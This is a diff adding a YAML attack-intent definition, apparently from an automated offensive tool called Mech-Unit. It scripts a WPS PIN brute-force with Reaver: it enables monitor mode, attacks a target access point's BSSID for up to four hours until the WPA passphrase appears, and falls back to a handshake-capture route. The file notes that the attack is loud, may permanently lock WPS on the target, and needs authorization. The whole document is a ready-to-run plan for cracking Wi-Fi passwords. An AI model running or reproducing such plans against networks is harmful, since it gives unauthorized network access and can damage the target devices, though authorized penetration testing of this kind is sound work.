@@ -1,0 +1,48 @@
+# Mech-Unit attack intent — WPS PIN brute-force via Reaver.
+# Recovers the WPA passphrase from WPS-enabled APs, bypassing handshake
+# capture entirely. Slow (hours) and loud.
+id: wifi_wps
+name: WPS PIN Brute-Force (Reaver)
+category: wireless
+operator_label: "Crack a WiFi password via WPS"
+operator_description: >
+  Brute-forces the WPS PIN of the target AP with Reaver and recovers the
+  WPA passphrase directly — no handshake, no wordlist. Only works when WPS
+  is exposed and not rate-limiting. Very slow (hours per PIN run).
+outcome: "WPA passphrase recovered from the WPS registrar"
+grants: [wifi.psk]
+time_to_impact: hours
+noise: high
+risk_notes: >
+  Aggressive brute-force against the AP's registrar; may crash or
+  permanently lock WPS on the target. Authorization required.
+
+preconditions:
+  - probe: wireless_adapter_monitor_capable
+  - probe: tools_present
+    with: [reaver]
+
+plan:
+  - step: monitor_up
+    tool: monitor_mode_enable
+    args:
+      interface: "{{ resolver.interface.monitor }}"
+
+  - step: pin_attack
+    tool: reaver_attack
+    args:
+      interface: "{{ resolver.interface.monitor }}"
+      bssid: "{{ target.bssid }}"
+      channel: "{{ resolver.channel.or_hop }}"
+    max_wait: 14400
+    gate:
+      output: "WPA PSK|'WPA PSK'"
+    on_fail: warn
+    fallbacks:
+      - step: handshake_route
+        use_intent: wifi_wpa_handshake
+
+artifacts:
+  wps_log: "{{ plan_dir }}/reaver-output.log"
+
+llm_required: false
